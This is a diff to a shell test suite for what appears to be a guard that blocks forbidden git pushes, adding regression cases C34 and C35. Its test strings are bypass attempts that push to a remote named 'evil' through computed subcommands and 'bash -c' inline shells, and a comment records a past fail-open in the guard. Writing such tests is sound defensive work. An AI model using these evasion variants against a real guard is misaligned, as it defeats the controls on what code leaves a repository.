@@ -97,6 +97,12 @@ expect_block   "C28 computed program"        "$WS"     "\$(echo git) push evil H
 expect_block   "C30 computed subcommand"     "$WS"     "git \$(echo push) evil HEAD:main"
 expect_block   "C31 var subcommand"          "$WS"     "git \"\$SUB\" evil HEAD:main"
 expect_block   "C33 unterminated quote"      "$WS"     "git push evil \"unterminated"
+# REGRESSION (Phase-15 re-review): an inline-shell (bash -c) forbidden push COMBINED with a top-level push.
+# The IR emits the inline payload push node with a PAYLOAD-RELATIVE span; slicing it into the OUTER command
+# once re-classified the forbidden 'evil' node as the safe 'origin' push → AUTO (a span-alias fail-open).
+# Now a git-push inside an inline shell → IP → deterministic BLOCK. Must stay BLOCK, shim not run.
+expect_block   "C34 inline-shell + toplevel" "$WS"     "git push origin HEAD:feature/x; bash -c 'git push evil HEAD:main'"
+expect_block   "C35 inline-shell forbidden"  "$WS"     "bash -c 'git push evil HEAD:main'"
 
 echo "════ false-positive controls → NOT blocked ════"
 expect_nonpush "F41 quoted mention"          "$WS"     "echo 'git push evil'"
